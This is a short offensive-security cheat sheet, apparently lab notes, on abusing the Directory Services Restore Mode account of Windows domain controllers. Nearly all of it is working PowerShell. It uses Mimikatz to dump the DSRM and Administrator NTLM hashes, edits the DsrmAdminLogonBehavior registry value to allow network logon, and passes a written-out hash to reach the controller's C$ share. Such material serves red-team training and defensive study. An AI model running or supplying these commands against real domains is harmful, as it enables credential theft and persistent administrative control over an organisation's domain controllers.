# DSRM

Directory Services Restore Mode (DSRM) is a Safe Mode boot option for Windows Server domain controllers and the main purpose of DSRM is to help system admins log in to the system to restore or repair an AD database.\
\
Every Domain controller has local administrator account called "Administrator" and his password is the DSRM password.

DSRM Password (SafeModePassword) is required when a server is promoted to DC and it is rarely changed

After altering the config on DC, it is possible to pass the NTLM hash of the this user to access the DC.

There are policies in the orgs saying krbtgt password/hash to be rotated after a specified time frame, but most of the orgs don't have any policy on rotating the password/hash for this "Local Admin on the DC I.e, DSRM Password"

## Dump DSRM NTLM hash

{% hint style="info" %}
Require Domain Admin privileges
{% endhint %}

```powershell
# dumping from sam - DSRM local Administrator hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' 
```

```powershell
# dumping from lsass - Administrator hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
```

## Change Logon Behavior

In order to use DSRM account hash we need to change these registry key

```powershell
# Entering DC session
Enter-PSSession -ComputerName dcorp-dc

# Check if key exists
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior'

# If exists set his value to 2
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -Verbose

# If does not exist create it and set his value to 2
New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehavior' -Value 2 -PropertyType DWORD -Verbose
```

## Passing the hash

```powershell
# /domain - the domain controller
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
/ntlm:a102ad5753f4c441e3af31c97fad86fd 
/run:powershell.exe"'


# Check if worked
ls \\dcorp-dc\C$
```
